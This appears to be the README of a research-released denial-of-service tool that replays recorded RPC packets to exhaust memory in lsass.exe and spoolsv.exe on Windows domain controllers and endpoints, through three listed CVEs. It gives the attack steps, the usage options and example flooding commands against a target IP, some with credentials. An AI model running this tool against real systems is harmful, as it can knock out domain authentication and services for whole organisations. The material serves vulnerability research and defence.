# Win-DoS RPC Attacks

A tool implementing the "TorpeDoS" technique - A single-sourced DDoS-like attack exploiting flaws in Microsoft's RPC protocol. The tool replays recorded RPC packets of RPC calls using the TorpeDoS technique.

The tool comes with 3 packet dumps of RPC packets that exploit the following vulnerabilities that were discovered in the Win-DoS research:
- **NetLogon RPC DoS #1** (CVE-2025-26673) - Memory exhaustion in `NetrServerReqChallenge` function affecting Domain Controllers
- **NetLogon RPC DoS #2** (CVE-2025-49716) - Memory exhaustion in `DsrAddressToSiteNamesW` function affecting Domain Controllers
- **Spoolsv RPC DoS** (CVE-2025-49722) - Memory exhaustion in `RpcEnumPrinters` function affecting Windows 11 endpoints

## How it works

1. **Port Resolution**:
   Queries endpoint mapper to find RPC service port.

2. **Session Establishment**:
   Binds all the RPC clients to the target RPC interfaces.

3. **Authentication** (if required):
   Applies NTLM signing on the RPC packets to replay according to the information returned by the bind ack.

4. **Packet Replay**:
   Sends recorded packets (with proper signatures if needed).

5. **Resource Exhaustion**:
   Triggers memory exhaustion in target Windows services (lsass.exe, spoolsv.exe).



## Setup

**Install Dependencies**:
```bash
pip install -r requirements.txt
```

## Usage

```bash
usage: main.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] --packets-file PACKETS_FILE [--delay-between-iterations DELAY_BETWEEN_ITERATIONS] -c REPLAY_COUNT --iterations ITERATIONS [-w WORKER_COUNT] target_host

TorpeDoS RPC flooder

positional arguments:
  target_host           RPC server address

options:
  -h, --help            show this help message and exit
  -u, --username USERNAME
                        Username for RPC authentication
  -p, --password PASSWORD
                        Password for RPC authentication
  -d, --domain DOMAIN   Domain for RPC authentication
  --packets-file PACKETS_FILE
                        Path to a file containing the RPC packets to replay
  --delay-between-iterations DELAY_BETWEEN_ITERATIONS
                        Delay (in seconds) to wait after all the RPC calls are sent between iterations (default: 30)
  -c, --replay-count REPLAY_COUNT
                        Number of parallel bind sessions to open
  --iterations ITERATIONS
                        Number of times to repeat the replay count
  -w, --worker-count WORKER_COUNT
                        Number of threads to use in each stage
```

**Example (Unauthenticated)**:
```bash
python main.py 192.168.1.100 --packets-file packets_to_send_spool.txt --replay-count 10000 --iterations 3
```

**Example (Authenticated)**:
```bash
python main.py 192.168.1.100 --packets-file packets_to_send_req_challenge.txt --replay-count 10000 --iterations 2 --username Administrator --password P@ssw0rd --domain DOMAIN.COM
```
